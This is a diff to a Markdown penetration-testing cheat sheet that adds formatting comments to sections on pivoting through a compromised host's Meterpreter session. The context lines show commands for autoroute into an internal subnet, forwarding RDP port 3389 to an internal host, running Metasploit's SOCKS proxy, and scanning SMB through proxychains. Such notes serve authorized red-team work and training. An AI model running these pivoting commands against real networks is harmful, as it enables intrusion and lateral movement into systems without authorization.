@@ -5,6 +5,7 @@ Using a compromised host with a Meterpreter session to route traffic into intern
 ## Setup Autoroute
 
 Add a route to the internal subnet through the compromised session.
+<!-- cmd: linux -->
 ```bash
 # Inside meterpreter
 run autoroute -s 172.16.0.0/24
@@ -19,6 +20,7 @@ run
 ## Port Forwarding
 
 Forward a local port to a remote host and port accessible from the compromised machine.
+<!-- cmd: linux -->
 ```bash
 # Inside meterpreter
 # Forward local port 3389 to 172.16.0.10:3389 through the session
@@ -34,6 +36,7 @@ portfwd list
 ## SOCKS Proxy (Proxychains)
 
 Start a SOCKS proxy to route external tools (nmap, curl, etc.) through the Meterpreter session.
+<!-- cmd: linux -->
 ```bash
 # Inside msfconsole
 use auxiliary/server/socks_proxy
@@ -43,6 +46,7 @@ run -j
 ```
 
 Configure `/etc/proxychains.conf` or `/etc/proxychains4.conf` to use `socks4 127.0.0.1 1080`.
+<!-- cmd: linux -->
 ```bash
 proxychains nmap -sT -Pn -p445 172.16.0.10
 ```
